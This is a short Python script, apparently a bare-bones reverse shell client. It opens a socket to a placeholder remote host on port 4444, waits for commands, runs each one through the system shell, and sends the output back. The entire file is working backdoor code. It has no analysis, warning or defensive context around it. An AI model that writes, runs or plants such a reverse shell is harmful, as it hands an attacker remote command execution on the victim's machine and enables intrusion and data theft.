import socket
import subprocess
import os 

REMOTE_HOST = "IP"
REMOTE_PORT = 4444
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST ,REMOTE_PORT))
print("[-] Connection Initiated!")

while 1 == 1:
    print('[-] waiting commands')
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response ...")
    client.send(output + output_error)
